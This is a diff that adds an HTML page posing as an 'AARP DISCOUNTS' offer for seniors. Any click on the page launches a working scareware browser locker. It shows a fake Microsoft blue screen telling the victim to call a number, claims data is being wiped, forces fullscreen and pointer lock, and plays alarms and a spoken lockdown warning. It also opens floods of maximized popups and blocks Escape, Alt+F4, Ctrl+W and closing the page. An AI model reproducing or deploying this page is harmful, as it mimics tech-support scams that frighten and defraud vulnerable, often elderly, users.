@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AARP DISCOUNTS - Exclusive Savings</title>
+    
+    <!-- Load Tone.js for audio generation -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tone/14.8.49/Tone.min.js"></script>
+    <!-- Tailwind CSS for the bait page styling -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <style>
+        /* --- CORE PRANK STYLES (Hidden Initially) --- */
+        body.prank-active {
+            font-family: 'Consolas', 'Courier New', monospace;
+            line-height: 1.5; 
+            background-color: #0078D7; 
+            color: #FFFFFF;
+            cursor: none !important; /* Cursor hidden during prank */
+            overflow: hidden;
+            text-align: left;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            width: 100vw;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Hide BSOD content by default */
+        .bsod-container {
+            display: none; 
+            width: 90%;
+            max-width: 900px; 
+            padding: 40px; 
+            z-index: 5; 
+        }
+
+        /* --- BAIT STYLES (Visible Initially) --- */
+        #start-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999; 
+            
+            /* FULL SCREEN BACKGROUND IMAGE */
+            background-image: url('Gemini_Generated_Image_qhpmhqqhpmhqqhpm.jpg'); 
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Inter', sans-serif;
+        }
+
+        /* Text Overlay Box */
+        .bait-content {
+            background-color: rgba(255, 255, 255, 0.9); /* White semi-transparent background */
+            padding: 3rem;
+            border-radius: 1rem;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
+            max-width: 600px;
+            width: 90%;
+            backdrop-filter: blur(5px);
+            z-index: 10001;
+        }
+
+        /* Invisible Trigger Grid (Failsafe: Any click starts the prank) */
+        #trigger-grid {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9998; /* Behind the content box but covering the background */
+            cursor: default;
+        }
+
+        /* --- PRANK VISUAL EFFECTS --- */
+        
+        /* Screen Shake Animation */
+        @keyframes shake {
+            0% { transform: translate(1px, 1px) rotate(0deg); }
+            10% { transform: translate(-1px, -2px) rotate(-1deg); }
+            20% { transform: translate(-3px, 0px) rotate(1deg); }
+            30% { transform: translate(3px, 2px) rotate(0deg); }
+            40% { transform: translate(1px, -1px) rotate(1deg); }
+            50% { transform: translate(-1px, 2px) rotate(-1deg); }
+            60% { transform: translate(-3px, 1px) rotate(0deg); }
+            70% { transform: translate(3px, 1px) rotate(-1deg); }
+            80% { transform: translate(-1px, -1px) rotate(1deg); }
+            90% { transform: translate(1px, 2px) rotate(0deg); }
+            100% { transform: translate(1px, -2px) rotate(-1deg); }
+        }
+        body.shake-active {
+            animation: shake 0.01s infinite; 
+        }
+
+        /* BSOD Typography */
+        .smiley { font-size: 100px; line-height: 1; margin-bottom: 30px; }
+        .message-title { font-size: 42px; font-weight: normal; margin-bottom: 25px; }
+        .message-details { font-size: 18px; line-height: 1.8; margin-bottom: 25px; white-space: pre-wrap; }
+        .message-details strong { font-weight: normal; color: #CC0000; } /* Dark Red Progress */
+        .stop-code { font-size: 14px; opacity: 0.8; margin-top: 40px; }
+
+        /* Red Flash Overlay */
+        #taunt-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(255, 0, 0, 0.9); 
+            display: flex; align-items: center; justify-content: center;
+            z-index: 20000; 
+            opacity: 0; pointer-events: none; 
+            transition: opacity 0.001s linear; 
+        }
+        #taunt-overlay.active { opacity: 1; }
+        .overlay-text {
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size: 72px; font-weight: bold; color: #FFFFFF;
+            text-shadow: 0 0 40px rgba(255, 255, 0, 1.0);
+            animation: pulsate 0.05s infinite alternate;
+            text-align: center;
+        }
+        @keyframes pulsate { from { opacity: 0.5; } to { opacity: 1.0; } }
+        
+        /* Universal Cursor Hiding (Active only during prank) */
+        body.prank-active * {
+            cursor: none !important;
+            user-select: none;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- 1. BAIT SCREEN (Visible Initially) -->
+    <div id="start-overlay">
+        <!-- Invisible Failsafe Grid (Clicks outside card also trigger prank) -->
+        <div id="trigger-grid" onclick="activatePrank()"></div>
+
+        <div class="bait-content">
+            <h1 class="text-5xl font-bold text-gray-800 mb-4">AARP DISCOUNTS</h1>
+            <p class="text-xl text-gray-600 font-semibold mb-8">Exclusive Savings For Savvy Seniors</p>
+            
+            <p class="text-gray-700 text-lg mb-8">
+                Access thousands of new deals, travel vouchers, and healthcare savings now updated for 2025. Don't miss out on these exclusive, members-only benefits!
+            </p>
+            
+            <!-- THE TRIGGER BUTTON -->
+            <button onclick="activatePrank()" class="bg-red-600 hover:bg-red-700 text-white font-bold py-4 px-12 rounded-full shadow-xl text-2xl transition transform hover:scale-105 z-50 relative w-full">
+                Shop Now!
+            </button>
+            
+            <p class="text-sm text-gray-400 mt-6">✔ TRUSTED RATES | Membership required.</p>
+        </div>
+    </div>
+
+    <!-- 2. PRANK ELEMENTS (Hidden Initially) -->
+    <div id="taunt-overlay">
+        <div id="overlay-text" class="overlay-text">[ FATAL ERROR: IMMUNITY LOOP REINFORCED ]</div>
+    </div>
+
+    <div id="bsod-container" class="bsod-container">
+        <div class="smiley">:(</div>
+        <div class="message-title">Microsoft detected a virus on your computer and have locked your device to prevent malicious activities. To resolve this issue Please call Microsoft @ XXXXXXXXXXX</div>
+        <div class="message-details">
+Do not restart your computer or you may lose your important data that you have. you can search online later for this error: CRITICAL_PROCESS_DIED<br>
+Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
+        </div>
+        <div class="stop-code">Click anywhere to begin CRITICAL FAILSAFE SEQUENCE...</div>
+    </div>
+
+    <script>
+        // --- CONFIGURATION ---
+        // Global variables
+        const tauntOverlay = document.getElementById('taunt-overlay');
+        const tauntText = document.getElementById('overlay-text');
+        const progressEl = document.getElementById('progress-percent');
+        const startOverlay = document.getElementById('start-overlay');
+        const bsodContainer = document.getElementById('bsod-container');
+
+        let isSimulatingFailure = false;
+        let audioContextStarted = false;
+        let progress = 0;
+        let prankActivated = false; 
+        let ambientGlitchInterval;
+
+        // --- AUDIO UTILITIES (PCM to WAV) ---
+        function base64ToArrayBuffer(base64) {
+            const binaryString = atob(base64);
+            const len = binaryString.length;
+            const bytes = new Uint8Array(len);
+            for (let i = 0; i < len; i++) bytes[i] = binaryString.charCodeAt(i);
+            return bytes.buffer;
+        }
+
+        function pcmToWav(pcm16, sampleRate) {
+            const numChannels = 1, bitsPerSample = 16;
+            const byteRate = sampleRate * numChannels * (bitsPerSample / 8);
+            const blockAlign = numChannels * (bitsPerSample / 8);
+            const dataSize = pcm16.length * 2;
+            const buffer = new ArrayBuffer(44 + dataSize);
+            const view = new DataView(buffer);
+            let offset = 0;
+            const writeString = (s) => { for (let i = 0; i < s.length; i++) view.setUint8(offset++, s.charCodeAt(i)); };
+            
+            writeString('RIFF'); view.setUint32(offset, 36 + dataSize, true); offset += 4;
+            writeString('WAVE'); writeString('fmt '); view.setUint32(offset, 16, true); offset += 4;
+            view.setUint16(offset, 1, true); offset += 2; view.setUint16(offset, numChannels, true); offset += 2;
+            view.setUint32(offset, sampleRate, true); offset += 4; view.setUint32(offset, byteRate, true); offset += 4;
+            view.setUint16(offset, blockAlign, true); offset += 2; view.setUint16(offset, bitsPerSample, true); offset += 2;
+            writeString('data'); view.setUint32(offset, dataSize, true); offset += 4;
+            for (let i = 0; i < pcm16.length; i++) { view.setInt16(offset, pcm16[i], true); offset += 2; }
+            return new Blob([view], { type: 'audio/wav' });
+        }
+
+        // --- TONE.JS SYNTHS ---
+        const alarmSynth = new Tone.AMSynth().toDestination();
+        const noiseSynth = new Tone.NoiseSynth({ volume: 15 }).toDestination();
+        const scaryDroneSynth = new Tone.Synth({ oscillator: { type: "sawtooth" } }).toDestination();
+        const pingSynth = new Tone.NoiseSynth({ volume: 5 }).toDestination();
+
+        const alarmSequence = new Tone.Sequence((time, note) => {
+            alarmSynth.triggerAttackRelease(note, "16n", time);
+        }, ["C#6", "D6", "C#6", "D6"], "16n");
+        alarmSequence.loop = true;
+
+        const pingSequence = new Tone.Sequence((time) => {
+             pingSynth.triggerAttackRelease("64n", time);
+        }, ["*"], "32n");
+        pingSequence.loop = true;
+
+        // --- LOGIC FUNCTIONS ---
+
+        const hideAndLock = () => {
+            if (!prankActivated) return;
+            document.documentElement.style.cursor = 'none';
+            if (!document.fullscreenElement) forceFullscreen();
+            requestAnimationFrame(hideAndLock);
+        };
+
+        function forceFullscreen() {
+            const el = document.documentElement;
+            const rfs = el.requestFullscreen || el.mozRequestFullScreen || el.webkitRequestFullscreen || el.msRequestFullscreen;
+            if(rfs) rfs.call(el).catch(e=>{});
+        }
+
+        function forcePointerLock() {
+            const el = document.documentElement;
+            const rpl = el.requestPointerLock || el.mozRequestPointerLock || el.webkitRequestPointerLock;
+            if(rpl && !document.pointerLockElement) rpl.call(el);
+        }
+
+        function playScaryDrone() {
+             scaryDroneSynth.triggerAttackRelease("C1", "3s");
+        }
+
+        function startProgressLoop() {
+            const i = setInterval(() => {
+                if (!prankActivated) { clearInterval(i); return; }
+                if (progress < 100) {
+                    progress += Math.floor(Math.random() * 3) + 1;
+                    if(progress > 100) progress = 100;
+                    progressEl.textContent = `${progress}% complete`;
+                } else {
+                    progressEl.textContent = `100% complete... LOCKDOWN COMPLETE. DATA IS GONE.`;
+                    clearInterval(i);
+                }
+            }, 50);
+        }
+
+        function startBackgroundAlarm() {
+            if (!prankActivated || audioContextStarted) return;
+            audioContextStarted = true;
+            alarmSequence.start(0); 
+            pingSequence.start(0);
+            Tone.Transport.bpm.value = 600; 
+            Tone.Transport.start();
+            startProgressLoop();
+        }
+
+        async function speakAndPlayWarning() {
+            const apiKey = ""; // Use provided environment key if available, else empty
+            const ttsPrompt = "Say in a firm, urgent voice: Warning. Critical system failure detected. Your device is now locked down. Do not attempt to close this window. Calling for immediate assistance.";
+            
+            try {
+                const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-tts:generateContent?key=${apiKey}`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ contents: [{ parts: [{ text: ttsPrompt }] }], generationConfig: { responseModalities: ["AUDIO"], speechConfig: { voiceConfig: { prebuiltVoiceConfig: { voiceName: "Charon" } } } } })
+                });
+                if (!response.ok) throw new Error("TTS Failed");
+                const result = await response.json();
+                const audioData = result?.candidates?.[0]?.content?.parts?.[0]?.inlineData?.data;
+                if (audioData) {
+                    const wavBlob = pcmToWav(new Int16Array(base64ToArrayBuffer(audioData)), 24000);
+                    const audio = new Audio(URL.createObjectURL(wavBlob));
+                    audio.play();
+                    audio.onended = startBackgroundAlarm;
+                } else startBackgroundAlarm();
+            } catch (e) { startBackgroundAlarm(); }
+        }
+
+        // --- UPDATED: MAXIMIZED WINDOW CALCULATIONS ---
+        function getMaximizedFeatures() {
+            // Uses screen.availWidth and height to fill the user's desktop
+            const w = window.screen.availWidth;
+            const h = window.screen.availHeight;
+            return `width=${w},height=${h},left=0,top=0,resizable=yes,scrollbars=yes,status=yes,toolbar=no,menubar=no,location=no`;
+        }
+
+        const autoStartUrl = window.location.href.split('#')[0] + "#start";
+
+        function startSecondaryFlood() {
+            let count = 0;
+            const i = setInterval(() => {
+                if (count >= 5) clearInterval(i);
+                // Open MAXIMIZED window
+                window.open(autoStartUrl, '_blank', getMaximizedFeatures());
+                count++;
+            }, 50);
+        }
+        function startSynchronousBlast() {
+            for (let i = 0; i < 5; i++) {
+                 // Open MAXIMIZED window
+                 window.open(autoStartUrl, '_blank', getMaximizedFeatures());
+            }
+        }
+        
+        function repeatWindowFlood() {
+            startSynchronousBlast(); startSecondaryFlood();
+        }
+
+        function simulateClosingFailure(isEscape) {
+            if (!prankActivated || isSimulatingFailure) return;
+            isSimulatingFailure = true;
+            tauntOverlay.classList.add('active');
+            document.body.classList.add('shake-active');
+            tauntText.style.transform = `translate(${Math.random()*10-5}px, ${Math.random()*10-5}px)`;
+            if (isEscape && Tone.Transport.state === 'started') {
+                noiseSynth.triggerAttackRelease("32n");
+                Tone.Transport.bpm.value = 900;
+            }
+            setTimeout(() => {
+                tauntOverlay.classList.remove('active');
+                document.body.classList.remove('shake-active');
+                isSimulatingFailure = false;
+                if (isEscape && Tone.Transport.state === 'started') Tone.Transport.bpm.value = 600;
+            }, 30);
+        }
+
+        function startAmbientGlitchLoop() {
+            simulateClosingFailure(false);
+            if(prankActivated) setTimeout(startAmbientGlitchLoop, Math.random() * 1300 + 200);
+        }
+
+        // --- MAIN ACTIVATION ---
+        window.activatePrank = function() {
+            if (prankActivated) return;
+            prankActivated = true;
+
+            // 1. UI TRANSITION
+            startOverlay.style.display = 'none';
+            bsodContainer.style.display = 'block';
+            document.body.classList.add('prank-active');
+
+            // 2. LOCKDOWN
+            forceFullscreen();
+            forcePointerLock();
+            requestAnimationFrame(hideAndLock);
+            startAmbientGlitchLoop();
+
+            // 3. AUDIO
+            Tone.start().then(() => {
+                playScaryDrone();
+                if (window.location.hash !== '#start') speakAndPlayWarning();
+                else startBackgroundAlarm();
+            });
+
+            // 4. POPUP FLOOD (Repeats on every click)
+            repeatWindowFlood();
+            document.body.addEventListener('click', repeatWindowFlood);
+        };
+
+        // Auto-start if hash is present (for popups)
+        if (window.location.hash === '#start') {
+            activatePrank();
+        }
+
+        // Traps
+        document.addEventListener('fullscreenchange', () => { if(!document.fullscreenElement && prankActivated) { simulateClosingFailure(true); setTimeout(forceFullscreen,0); }});
+        window.onblur = () => { if(prankActivated) { simulateClosingFailure(true); setTimeout(()=>window.focus(),1); }};
+        window.onbeforeunload = () => { if(prankActivated) { simulateClosingFailure(true); return "SYSTEM TRAP ACTIVE"; }};
+        document.onkeydown = (e) => {
+            if(prankActivated && (e.key === "Escape" || e.key === "F11" || (e.altKey && e.key === 'F4') || (e.ctrlKey && e.key === 'w'))) {
+                e.preventDefault(); e.stopPropagation(); simulateClosingFailure(true);
+            }
+        };
+    </script>
+</body>
+</html>
